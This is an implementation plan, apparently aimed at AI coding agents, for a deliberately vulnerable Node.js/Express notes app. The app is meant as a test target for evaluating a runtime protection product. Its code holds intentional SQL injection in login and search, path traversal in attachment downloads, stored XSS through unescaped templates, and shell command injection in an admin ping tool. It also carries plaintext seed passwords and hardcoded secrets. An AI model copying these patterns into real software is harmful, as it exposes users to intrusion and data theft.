# Vulnerable Notes App — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a deliberately vulnerable Node.js/Express notes/blog app with four exploitable vulnerabilities (SQLi, XSS, Path Traversal, Command Injection) to serve as a realistic baseline target for logSguarDian RASP evaluation.

**Architecture:** Single Express app with EJS server-side rendering, PostgreSQL via Docker Compose, raw `pg` driver with string-concatenated queries at all four vulnerability points. No ORM, no security libraries, no JWT — cookie-based sessions via `express-session`.

**Tech Stack:** Node.js 20, Express 4, EJS, pg (node-postgres), express-session, multer (file uploads), PostgreSQL 15, Docker Compose v2.

---

## File Map

| File | Responsibility |
|------|---------------|
| `package.json` | Dependencies declaration |
| `Dockerfile` | Node 20 image, wait-for-db, start server |
| `docker-compose.yml` | App + Postgres services, volume, seed mount |
| `.env.example` | Environment variable template |
| `src/server.js` | HTTP entry point |
| `src/app.js` | Express instance, middleware stack, route mounting |
| `src/db.js` | pg Pool — single shared connection pool |
| `src/routes/auth.js` | `POST /login` (SQLi), `POST /register`, `POST /logout`, `GET /login`, `GET /register` |
| `src/routes/posts.js` | CRUD `/posts`, `GET /posts/search` (SQLi), `GET /posts/:id/attachment` (Path Traversal), `POST /posts/:id/attachment` (upload) |
| `src/routes/profile.js` | `GET /profile`, `POST /profile` |
| `src/routes/admin.js` | `GET /admin`, `POST /admin/ping` (Command Injection) |
| `src/middleware/auth.js` | `requireLogin` and `requireAdmin` guards |
| `views/layout.ejs` | HTML shell with nav |
| `views/login.ejs` | Login form |
| `views/register.ejs` | Register form |
| `views/posts/index.ejs` | Post list |
| `views/posts/show.ejs` | Single post (XSS — unescaped content) |
| `views/posts/new.ejs` | New post form |
| `views/posts/edit.ejs` | Edit post form |
| `views/profile.ejs` | Profile page (XSS — unescaped bio) |
| `views/admin/index.ejs` | Admin panel with ping form |
| `views/error.ejs` | Generic error page |
| `public/style.css` | Minimal CSS |
| `db/init.sql` | Schema + seed (3 users, 10 posts) |
| `uploads/.gitkeep` | Uploads directory placeholder |
| `README.md` | Setup, ports, seed credentials |
| `VULNERABILITIES.md` | Endpoint, file:line, curl PoC for each vuln |

---

## Task 1: Project Scaffolding

**Files:**
- Create: `package.json`
- Create: `.env.example`

- [ ] **Step 1: Write package.json**

```json
{
  "name": "vulnerable-notes-app",
  "version": "1.0.0",
  "description": "Deliberately vulnerable notes app for RASP baseline evaluation",
  "main": "src/server.js",
  "scripts": {
    "start": "node src/server.js",
    "dev": "nodemon src/server.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "express-session": "^1.17.3",
    "ejs": "^3.1.9",
    "pg": "^8.11.3",
    "multer": "^1.4.5-lts.1"
  },
  "devDependencies": {
    "nodemon": "^3.0.2"
  }
}
```

- [ ] **Step 2: Write .env.example**

```
DB_HOST=localhost
DB_PORT=5432
DB_NAME=notesdb
DB_USER=notesuser
DB_PASSWORD=notespass
SESSION_SECRET=supersecretkey123
PORT=3000
UPLOAD_DIR=/app/uploads
```

- [ ] **Step 3: Commit**

```bash
git add package.json .env.example
git commit -m "chore: project scaffolding and env template"
```

---

## Task 2: Database Init SQL (Schema + Seed)

**Files:**
- Create: `db/init.sql`

- [ ] **Step 1: Write db/init.sql**

```sql
-- Schema
CREATE TABLE IF NOT EXISTS users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(64) UNIQUE NOT NULL,
  password VARCHAR(255) NOT NULL,
  bio TEXT DEFAULT '',
  role VARCHAR(16) DEFAULT 'user',
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS posts (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
  title VARCHAR(255) NOT NULL,
  content TEXT NOT NULL,
  attachment VARCHAR(255),
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Seed users (passwords stored as plain text intentionally)
INSERT INTO users (username, password, bio, role) VALUES
  ('admin',   'admin123',   'Site administrator. Manages the platform.',           'admin'),
  ('alice',   'alice123',   'Writer and coffee enthusiast.',                        'user'),
  ('bob',     'bob123',     'Developer by day, gamer by night.',                   'user')
ON CONFLICT (username) DO NOTHING;

-- Seed posts
INSERT INTO posts (user_id, title, content) VALUES
  (2, 'My First Post',        'Hello world! This is Alice writing her first note on this platform.'),
  (2, 'Coffee Brewing Tips',  'The perfect espresso requires 9 bars of pressure and 25-30 seconds of extraction time.'),
  (2, 'Book Review: Dune',    'Frank Herbert''s world-building is unparalleled. The ecology of Arrakis feels real.'),
  (3, 'Vim vs Emacs',         'After years of debate I settled on Vim. Muscle memory wins.'),
  (3, 'Docker Networking',    'Bridge networks work for most cases but host mode cuts latency significantly.'),
  (3, 'My Gaming Setup',      'RTX 4090, 4K 144Hz monitor. Overkill? Maybe. Worth it? Absolutely.'),
  (1, 'Platform Guidelines',  'Please keep content respectful. Violations will result in account suspension.'),
  (1, 'Maintenance Window',   'Scheduled downtime on Sunday 02:00-04:00 UTC for database migration.'),
  (2, 'Productivity Hacks',   'Pomodoro technique changed my life. 25 minutes focus, 5 minute break.'),
  (3, 'Weekend Project',      'Built a small CLI tool in Go to parse nginx logs. Open sourcing soon.')
ON CONFLICT DO NOTHING;
```

- [ ] **Step 2: Commit**

```bash
git add db/init.sql
git commit -m "chore: database schema and seed data"
```

---

## Task 3: Docker Infrastructure

**Files:**
- Create: `Dockerfile`
- Create: `docker-compose.yml`
- Create: `uploads/.gitkeep`

- [ ] **Step 1: Write Dockerfile**

```dockerfile
FROM node:20-alpine

WORKDIR /app

COPY package.json ./
RUN npm install --production

COPY . .

RUN mkdir -p /app/uploads

EXPOSE 3000

CMD ["node", "src/server.js"]
```

- [ ] **Step 2: Write docker-compose.yml**

```yaml
version: "3.9"

services:
  db:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: notesdb
      POSTGRES_USER: notesuser
      POSTGRES_PASSWORD: notespass
    volumes:
      - postgres_data:/var/lib/postgresql/data
      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U notesuser -d notesdb"]
      interval: 5s
      timeout: 5s
      retries: 10

  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      DB_HOST: db
      DB_PORT: 5432
      DB_NAME: notesdb
      DB_USER: notesuser
      DB_PASSWORD: notespass
      SESSION_SECRET: supersecretkey123
      PORT: 3000
      UPLOAD_DIR: /app/uploads
    volumes:
      - uploads_data:/app/uploads
    depends_on:
      db:
        condition: service_healthy

volumes:
  postgres_data:
  uploads_data:
```

- [ ] **Step 3: Create uploads placeholder**

```bash
touch uploads/.gitkeep
```

- [ ] **Step 4: Commit**

```bash
git add Dockerfile docker-compose.yml uploads/.gitkeep
git commit -m "chore: Docker and docker-compose infrastructure"
```

---

## Task 4: Database Connection Module

**Files:**
- Create: `src/db.js`

- [ ] **Step 1: Write src/db.js**

```javascript
const { Pool } = require('pg');

const pool = new Pool({
  host:     process.env.DB_HOST     || 'localhost',
  port:     parseInt(process.env.DB_PORT || '5432'),
  database: process.env.DB_NAME     || 'notesdb',
  user:     process.env.DB_USER     || 'notesuser',
  password: process.env.DB_PASSWORD || 'notespass',
});

pool.on('error', (err) => {
  console.error('Unexpected database error', err);
});

module.exports = pool;
```

- [ ] **Step 2: Commit**

```bash
git add src/db.js
git commit -m "feat: PostgreSQL connection pool"
```

---

## Task 5: Auth Middleware Guards

**Files:**
- Create: `src/middleware/auth.js`

- [ ] **Step 1: Write src/middleware/auth.js**

```javascript
function requireLogin(req, res, next) {
  if (!req.session || !req.session.user) {
    return res.redirect('/login');
  }
  next();
}

function requireAdmin(req, res, next) {
  if (!req.session || !req.session.user) {
    return res.redirect('/login');
  }
  if (req.session.user.role !== 'admin') {
    return res.status(403).render('error', {
      user: req.session.user,
      status: 403,
      message: 'Admin access required.'
    });
  }
  next();
}

module.exports = { requireLogin, requireAdmin };
```

- [ ] **Step 2: Commit**

```bash
git add src/middleware/auth.js
git commit -m "feat: session-based auth middleware guards"
```

---

## Task 6: Auth Routes (SQLi in login)

**Files:**
- Create: `src/routes/auth.js`

- [ ] **Step 1: Write src/routes/auth.js**

VULNERABILITY POINT — SQLi in POST /login:
The query string is built by direct string concatenation of username and password.
No parameterized queries. No sanitization.

```javascript
const express = require('express');
const router  = express.Router();
const db      = require('../db');

// GET /login
router.get('/login', (req, res) => {
  if (req.session.user) return res.redirect('/posts');
  res.render('login', { user: null, error: null });
});

// POST /login  — VULNERABLE: SQL Injection via string concatenation
router.post('/login', async (req, res) => {
  const { username, password } = req.body;
  try {
    // VULNERABLE: direct concatenation — allows ' OR '1'='1' -- bypass
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    const result = await db.query(query);
    if (result.rows.length === 0) {
      return res.status(401).render('login', { user: null, error: 'Invalid credentials.' });
    }
    req.session.user = {
      id:       result.rows[0].id,
      username: result.rows[0].username,
      role:     result.rows[0].role,
    };
    res.redirect('/posts');
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: null, status: 500, message: 'Internal server error.' });
  }
});

// GET /register
router.get('/register', (req, res) => {
  if (req.session.user) return res.redirect('/posts');
  res.render('register', { user: null, error: null });
});

// POST /register
router.post('/register', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).render('register', { user: null, error: 'Username and password required.' });
  }
  try {
    await db.query(
      'INSERT INTO users (username, password) VALUES ($1, $2)',
      [username, password]
    );
    res.redirect('/login');
  } catch (err) {
    if (err.code === '23505') {
      return res.status(400).render('register', { user: null, error: 'Username already taken.' });
    }
    console.error(err);
    res.status(500).render('error', { user: null, status: 500, message: 'Internal server error.' });
  }
});

// POST /logout
router.post('/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/login'));
});

module.exports = router;
```

- [ ] **Step 2: Commit**

```bash
git add src/routes/auth.js
git commit -m "feat: auth routes with intentionally vulnerable login (SQLi)"
```

---

## Task 7: Posts Routes (SQLi search + Path Traversal)

**Files:**
- Create: `src/routes/posts.js`

- [ ] **Step 1: Write src/routes/posts.js**

Two vulnerability points:
1. `GET /posts/search?q=` — SQLi via string concatenation in LIKE query
2. `GET /posts/:id/attachment?file=` — Path Traversal via `path.join(UPLOAD_DIR, file)` with no normalization

```javascript
const express  = require('express');
const router   = express.Router();
const db       = require('../db');
const multer   = require('multer');
const path     = require('path');
const fs       = require('fs');
const { requireLogin } = require('../middleware/auth');

const UPLOAD_DIR = process.env.UPLOAD_DIR || path.join(__dirname, '../../uploads');

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename:    (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`),
});
const upload = multer({ storage });

// GET /posts — list all posts
router.get('/', requireLogin, async (req, res) => {
  try {
    const result = await db.query(
      'SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id ORDER BY p.created_at DESC'
    );
    res.render('posts/index', { user: req.session.user, posts: result.rows, query: null });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// GET /posts/search?q=  — VULNERABLE: SQL Injection via string concatenation
router.get('/search', requireLogin, async (req, res) => {
  const q = req.query.q || '';
  try {
    // VULNERABLE: direct concatenation — allows ' UNION SELECT ... --
    const query = `SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id WHERE p.title LIKE '%${q}%' OR p.content LIKE '%${q}%' ORDER BY p.created_at DESC`;
    const result = await db.query(query);
    res.render('posts/index', { user: req.session.user, posts: result.rows, query: q });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// GET /posts/new
router.get('/new', requireLogin, (req, res) => {
  res.render('posts/new', { user: req.session.user, error: null });
});

// POST /posts
router.post('/', requireLogin, upload.single('attachment'), async (req, res) => {
  const { title, content } = req.body;
  if (!title || !content) {
    return res.status(400).render('posts/new', { user: req.session.user, error: 'Title and content required.' });
  }
  const attachment = req.file ? req.file.filename : null;
  try {
    await db.query(
      'INSERT INTO posts (user_id, title, content, attachment) VALUES ($1, $2, $3, $4)',
      [req.session.user.id, title, content, attachment]
    );
    res.redirect('/posts');
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// GET /posts/:id
router.get('/:id', requireLogin, async (req, res) => {
  try {
    const result = await db.query(
      'SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id WHERE p.id = $1',
      [req.params.id]
    );
    if (result.rows.length === 0) {
      return res.status(404).render('error', { user: req.session.user, status: 404, message: 'Post not found.' });
    }
    res.render('posts/show', { user: req.session.user, post: result.rows[0] });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// GET /posts/:id/edit
router.get('/:id/edit', requireLogin, async (req, res) => {
  try {
    const result = await db.query('SELECT * FROM posts WHERE id = $1', [req.params.id]);
    if (result.rows.length === 0) {
      return res.status(404).render('error', { user: req.session.user, status: 404, message: 'Post not found.' });
    }
    const post = result.rows[0];
    if (post.user_id !== req.session.user.id && req.session.user.role !== 'admin') {
      return res.status(403).render('error', { user: req.session.user, status: 403, message: 'Not your post.' });
    }
    res.render('posts/edit', { user: req.session.user, post, error: null });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// POST /posts/:id/edit
router.post('/:id/edit', requireLogin, async (req, res) => {
  const { title, content } = req.body;
  try {
    const result = await db.query('SELECT * FROM posts WHERE id = $1', [req.params.id]);
    if (result.rows.length === 0) {
      return res.status(404).render('error', { user: req.session.user, status: 404, message: 'Post not found.' });
    }
    const post = result.rows[0];
    if (post.user_id !== req.session.user.id && req.session.user.role !== 'admin') {
      return res.status(403).render('error', { user: req.session.user, status: 403, message: 'Not your post.' });
    }
    await db.query(
      'UPDATE posts SET title = $1, content = $2, updated_at = NOW() WHERE id = $3',
      [title, content, req.params.id]
    );
    res.redirect(`/posts/${req.params.id}`);
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// POST /posts/:id/delete
router.post('/:id/delete', requireLogin, async (req, res) => {
  try {
    const result = await db.query('SELECT * FROM posts WHERE id = $1', [req.params.id]);
    if (result.rows.length === 0) {
      return res.status(404).render('error', { user: req.session.user, status: 404, message: 'Post not found.' });
    }
    const post = result.rows[0];
    if (post.user_id !== req.session.user.id && req.session.user.role !== 'admin') {
      return res.status(403).render('error', { user: req.session.user, status: 403, message: 'Not your post.' });
    }
    await db.query('DELETE FROM posts WHERE id = $1', [req.params.id]);
    res.redirect('/posts');
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// POST /posts/:id/attachment — upload file
router.post('/:id/attachment', requireLogin, upload.single('attachment'), async (req, res) => {
  if (!req.file) {
    return res.status(400).render('error', { user: req.session.user, status: 400, message: 'No file provided.' });
  }
  try {
    await db.query('UPDATE posts SET attachment = $1 WHERE id = $2', [req.file.filename, req.params.id]);
    res.redirect(`/posts/${req.params.id}`);
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// GET /posts/:id/attachment?file=  — VULNERABLE: Path Traversal
router.get('/:id/attachment', requireLogin, (req, res) => {
  const file = req.query.file;
  if (!file) {
    return res.status(400).json({ error: 'Missing file parameter.' });
  }
  // VULNERABLE: path.join does not prevent traversal when file contains ../
  const filePath = path.join(UPLOAD_DIR, file);
  fs.readFile(filePath, (err, data) => {
    if (err) {
      return res.status(404).json({ error: 'File not found.' });
    }
    res.setHeader('Content-Disposition', `attachment; filename="${path.basename(file)}"`);
    res.send(data);
  });
});

module.exports = router;
```

- [ ] **Step 2: Commit**

```bash
git add src/routes/posts.js
git commit -m "feat: posts routes with intentional SQLi (search) and path traversal (attachment)"
```

---

## Task 8: Profile Routes (XSS)

**Files:**
- Create: `src/routes/profile.js`

- [ ] **Step 1: Write src/routes/profile.js**

The XSS vector lives in the EJS templates (Task 11), but the route stores raw unescaped content in the database and passes it through to the view without any sanitization.

```javascript
const express = require('express');
const router  = express.Router();
const db      = require('../db');
const { requireLogin } = require('../middleware/auth');

// GET /profile
router.get('/', requireLogin, async (req, res) => {
  try {
    const result = await db.query('SELECT * FROM users WHERE id = $1', [req.session.user.id]);
    if (result.rows.length === 0) {
      return res.status(404).render('error', { user: req.session.user, status: 404, message: 'User not found.' });
    }
    res.render('profile', { user: req.session.user, profile: result.rows[0], success: null, error: null });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// POST /profile — stores raw bio without sanitization
router.post('/', requireLogin, async (req, res) => {
  const { bio } = req.body;
  try {
    await db.query('UPDATE users SET bio = $1 WHERE id = $2', [bio, req.session.user.id]);
    const result = await db.query('SELECT * FROM users WHERE id = $1', [req.session.user.id]);
    res.render('profile', {
      user:    req.session.user,
      profile: result.rows[0],
      success: 'Profile updated.',
      error:   null,
    });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// GET /users/:id — view another user's profile (triggers stored XSS from their bio)
router.get('/users/:id', requireLogin, async (req, res) => {
  try {
    const result = await db.query('SELECT id, username, bio, role, created_at FROM users WHERE id = $1', [req.params.id]);
    if (result.rows.length === 0) {
      return res.status(404).render('error', { user: req.session.user, status: 404, message: 'User not found.' });
    }
    res.render('profile', { user: req.session.user, profile: result.rows[0], success: null, error: null });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

module.exports = router;
```

- [ ] **Step 2: Commit**

```bash
git add src/routes/profile.js
git commit -m "feat: profile routes — bio stored raw, XSS rendered in template"
```

---

## Task 9: Admin Routes (Command Injection)

**Files:**
- Create: `src/routes/admin.js`

- [ ] **Step 1: Write src/routes/admin.js**

VULNERABILITY POINT — Command Injection in POST /admin/ping:
`child_process.exec` called with template literal that directly embeds user input.

```javascript
const express      = require('express');
const router       = express.Router();
const db           = require('../db');
const { exec }     = require('child_process');
const { requireAdmin } = require('../middleware/auth');

// GET /admin
router.get('/', requireAdmin, async (req, res) => {
  try {
    const users = await db.query('SELECT id, username, role, created_at FROM users ORDER BY id');
    const posts = await db.query('SELECT COUNT(*) AS count FROM posts');
    res.render('admin/index', {
      user:       req.session.user,
      users:      users.rows,
      postCount:  posts.rows[0].count,
      pingResult: null,
      pingError:  null,
    });
  } catch (err) {
    console.error(err);
    res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
  }
});

// POST /admin/ping  — VULNERABLE: Command Injection via exec + string concatenation
router.post('/ping', requireAdmin, (req, res) => {
  const { host } = req.body;
  if (!host) {
    return res.status(400).json({ error: 'Missing host parameter.' });
  }
  // VULNERABLE: user input embedded directly in shell command string
  exec(`ping -c 3 ${host}`, { timeout: 10000 }, async (err, stdout, stderr) => {
    try {
      const users = await db.query('SELECT id, username, role, created_at FROM users ORDER BY id');
      const posts = await db.query('SELECT COUNT(*) AS count FROM posts');
      res.render('admin/index', {
        user:       req.session.user,
        users:      users.rows,
        postCount:  posts.rows[0].count,
        pingResult: stdout || null,
        pingError:  stderr || (err ? err.message : null),
      });
    } catch (dbErr) {
      console.error(dbErr);
      res.status(500).render('error', { user: req.session.user, status: 500, message: 'Internal server error.' });
    }
  });
});

module.exports = router;
```

- [ ] **Step 2: Commit**

```bash
git add src/routes/admin.js
git commit -m "feat: admin routes with intentional command injection in /admin/ping"
```

---

## Task 10: Express App Entry Point

**Files:**
- Create: `src/app.js`
- Create: `src/server.js`

- [ ] **Step 1: Write src/app.js**

```javascript
const express  = require('express');
const session  = require('express-session');
const path     = require('path');

const authRoutes    = require('./routes/auth');
const postsRoutes   = require('./routes/posts');
const profileRoutes = require('./routes/profile');
const adminRoutes   = require('./routes/admin');

const app = express();

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../views'));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

app.use(session({
  secret:            process.env.SESSION_SECRET || 'supersecretkey123',
  resave:            false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    maxAge:   24 * 60 * 60 * 1000,
  },
}));

app.get('/', (req, res) => {
  if (req.session.user) return res.redirect('/posts');
  res.redirect('/login');
});

app.use('/',        authRoutes);
app.use('/posts',   postsRoutes);
app.use('/',        profileRoutes);
app.use('/admin',   adminRoutes);

app.use((req, res) => {
  res.status(404).render('error', { user: req.session.user || null, status: 404, message: 'Page not found.' });
});

module.exports = app;
```

- [ ] **Step 2: Write src/server.js**

```javascript
const app  = require('./app');
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Vulnerable notes app listening on http://0.0.0.0:${PORT}`);
});
```

- [ ] **Step 3: Commit**

```bash
git add src/app.js src/server.js
git commit -m "feat: Express app wiring and server entry point"
```

---

## Task 11: EJS Views

**Files:**
- Create: `views/layout.ejs`
- Create: `views/login.ejs`
- Create: `views/register.ejs`
- Create: `views/posts/index.ejs`
- Create: `views/posts/show.ejs`  ← XSS: `<%- post.content %>`
- Create: `views/posts/new.ejs`
- Create: `views/posts/edit.ejs`
- Create: `views/profile.ejs`    ← XSS: `<%- profile.bio %>`
- Create: `views/admin/index.ejs`
- Create: `views/error.ejs`

- [ ] **Step 1: Write views/layout.ejs**

Note: This is a partial used via `include` — EJS doesn't have layouts built-in, so each view embeds the nav inline. Write a shared `_nav.ejs` partial instead.

```html
<!-- views/_nav.ejs -->
<nav>
  <a href="/posts">Notes</a>
  <% if (user) { %>
    <a href="/profile">Profile</a>
    <% if (user.role === 'admin') { %>
      <a href="/admin">Admin</a>
    <% } %>
    <form action="/logout" method="POST" style="display:inline">
      <button type="submit">Logout (<%= user.username %>)</button>
    </form>
  <% } else { %>
    <a href="/login">Login</a>
    <a href="/register">Register</a>
  <% } %>
</nav>
```

- [ ] **Step 2: Write views/login.ejs**

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Login — NotesApp</title><link rel="stylesheet" href="/style.css"></head>
<body>
<%- include('_nav', { user: user }) %>
<main>
  <h1>Login</h1>
  <% if (error) { %><p class="error"><%= error %></p><% } %>
  <form action="/login" method="POST">
    <label>Username<input type="text" name="username" required></label>
    <label>Password<input type="password" name="password" required></label>
    <button type="submit">Login</button>
  </form>
  <p><a href="/register">Create an account</a></p>
</main>
</body>
</html>
```

- [ ] **Step 3: Write views/register.ejs**

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Register — NotesApp</title><link rel="stylesheet" href="/style.css"></head>
<body>
<%- include('_nav', { user: user }) %>
<main>
  <h1>Register</h1>
  <% if (error) { %><p class="error"><%= error %></p><% } %>
  <form action="/register" method="POST">
    <label>Username<input type="text" name="username" required></label>
    <label>Password<input type="password" name="password" required></label>
    <button type="submit">Create Account</button>
  </form>
  <p><a href="/login">Already have an account?</a></p>
</main>
</body>
</html>
```

- [ ] **Step 4: Write views/posts/index.ejs**

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Notes — NotesApp</title><link rel="stylesheet" href="/style.css"></head>
<body>
<%- include('../_nav', { user: user }) %>
<main>
  <div class="page-header">
    <h1>Notes</h1>
    <a href="/posts/new" class="btn">New Note</a>
  </div>
  <form action="/posts/search" method="GET" class="search-form">
    <input type="text" name="q" placeholder="Search notes..." value="<%= query || '' %>">
    <button type="submit">Search</button>
  </form>
  <% if (posts.length === 0) { %>
    <p>No notes found.</p>
  <% } else { %>
    <ul class="post-list">
      <% posts.forEach(post => { %>
        <li>
          <a href="/posts/<%= post.id %>"><%= post.title %></a>
          <span class="meta">by <a href="/users/<%= post.user_id %>"><%= post.username %></a> — <%= new Date(post.created_at).toLocaleDateString() %></span>
        </li>
      <% }) %>
    </ul>
  <% } %>
</main>
</body>
</html>
```

- [ ] **Step 5: Write views/posts/show.ejs — XSS vector: <%- %> (unescaped)**

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title><%= post.title %> — NotesApp</title><link rel="stylesheet" href="/style.css"></head>
<body>
<%- include('../_nav', { user: user }) %>
<main>
  <h1><%= post.title %></h1>
  <p class="meta">by <a href="/users/<%= post.user_id %>"><%= post.username %></a> — <%= new Date(post.created_at).toLocaleDateString() %></p>

  <!-- VULNERABLE: <%- %> renders post.content without HTML escaping — Stored XSS -->
  <div class="post-content"><%- post.content %></div>

  <% if (post.attachment) { %>
    <p><a href="/posts/<%= post.id %>/attachment?file=<%= post.attachment %>">Download attachment</a></p>
  <% } %>

  <% if (user && (user.id === post.user_id || user.role === 'admin')) { %>
    <div class="actions">
      <a href="/posts/<%= post.id %>/edit" class="btn">Edit</a>
      <form action="/posts/<%= post.id %>/delete" method="POST" style="display:inline">
        <button type="submit" class="btn btn-danger" onclick="return confirm('Delete this note?')">Delete</button>
      </form>
    </div>
    <h3>Upload Attachment</h3>
    <form action="/posts/<%= post.id %>/attachment" method="POST" enctype="multipart/form-data">
      <input type="file" name="attachment">
      <button type="submit">Upload</button>
    </form>
  <% } %>
</main>
</body>
</html>
```

- [ ] **Step 6: Write views/posts/new.ejs**

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>New Note — NotesApp</title><link rel="stylesheet" href="/style.css"></head>
<body>
<%- include('../_nav', { user: user }) %>
<main>
  <h1>New Note</h1>
  <% if (error) { %><p class="error"><%= error %></p><% } %>
  <form action="/posts" method="POST" enctype="multipart/form-data">
    <label>Title<input type="text" name="title" required></label>
    <label>Content<textarea name="content" rows="10" required></textarea></label>
    <label>Attachment (optional)<input type="file" name="attachment"></label>
    <button type="submit">Create Note</button>
  </form>
</main>
</body>
</html>
```

- [ ] **Step 7: Write views/posts/edit.ejs**

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Edit Note — NotesApp</title><link rel="stylesheet" href="/style.css"></head>
<body>
<%- include('../_nav', { user: user }) %>
<main>
  <h1>Edit Note</h1>
  <% if (error) { %><p class="error"><%= error %></p><% } %>
  <form action="/posts/<%= post.id %>/edit" method="POST">
    <label>Title<input type="text" name="title" value="<%= post.title %>" required></label>
    <label>Content<textarea name="content" rows="10" required><%= post.content %></textarea></label>
    <button type="submit">Save Changes</button>
  </form>
</main>
</body>
</html>
```

- [ ] **Step 8: Write views/profile.ejs — XSS vector: <%- %> (unescaped bio)**

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title><%= profile.username %>'s Profile — NotesApp</title><link rel="stylesheet" href="/style.css"></head>
<body>
<%- include('_nav', { user: user }) %>
<main>
  <h1><%= profile.username %></h1>
  <p class="meta">Role: <%= profile.role %> — Member since <%= new Date(profile.created_at).toLocaleDateString() %></p>

  <!-- VULNERABLE: <%- %> renders profile.bio without HTML escaping — Stored XSS -->
  <div class="bio"><%- profile.bio || '<em>No bio set.</em>' %></div>

  <% if (user && user.id === profile.id) { %>
    <% if (success) { %><p class="success"><%= success %></p><% } %>
    <% if (error) { %><p class="error"><%= error %></p><% } %>
    <h2>Edit Bio</h2>
    <form action="/profile" method="POST">
      <label>Bio<textarea name="bio" rows="5"><%= profile.bio || '' %></textarea></label>
      <button type="submit">Update Profile</button>
    </form>
  <% } %>
</main>
</body>
</html>
```

- [ ] **Step 9: Write views/admin/index.ejs**

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Admin Panel — NotesApp</title><link rel="stylesheet" href="/style.css"></head>
<body>
<%- include('../_nav', { user: user }) %>
<main>
  <h1>Admin Panel</h1>

  <section>
    <h2>Statistics</h2>
    <p>Total posts: <strong><%= postCount %></strong></p>
    <p>Total users: <strong><%= users.length %></strong></p>
  </section>

  <section>
    <h2>Users</h2>
    <table>
      <thead><tr><th>ID</th><th>Username</th><th>Role</th><th>Joined</th></tr></thead>
      <tbody>
        <% users.forEach(u => { %>
          <tr>
            <td><%= u.id %></td>
            <td><a href="/users/<%= u.id %>"><%= u.username %></a></td>
            <td><%= u.role %></td>
            <td><%= new Date(u.created_at).toLocaleDateString() %></td>
          </tr>
        <% }) %>
      </tbody>
    </table>
  </section>

  <section>
    <h2>Connectivity Diagnostic</h2>
    <form action="/admin/ping" method="POST">
      <label>Host to ping<input type="text" name="host" placeholder="e.g. 8.8.8.8" required></label>
      <button type="submit">Ping</button>
    </form>
    <% if (pingResult) { %>
      <pre class="output"><%= pingResult %></pre>
    <% } %>
    <% if (pingError) { %>
      <pre class="output error"><%= pingError %></pre>
    <% } %>
  </section>
</main>
</body>
</html>
```

- [ ] **Step 10: Write views/error.ejs**

```html
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Error <%= status %> — NotesApp</title><link rel="stylesheet" href="/style.css"></head>
<body>
<%- include('_nav', { user: user }) %>
<main>
  <h1>Error <%= status %></h1>
  <p><%= message %></p>
  <a href="/posts">Back to notes</a>
</main>
</body>
</html>
```

- [ ] **Step 11: Commit**

```bash
git add views/
git commit -m "feat: EJS views with unescaped bio and post content (Stored XSS)"
```

---

## Task 12: CSS

**Files:**
- Create: `public/style.css`

- [ ] **Step 1: Write public/style.css**

```css
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: system-ui, sans-serif; background: #f5f5f5; color: #222; line-height: 1.6; }
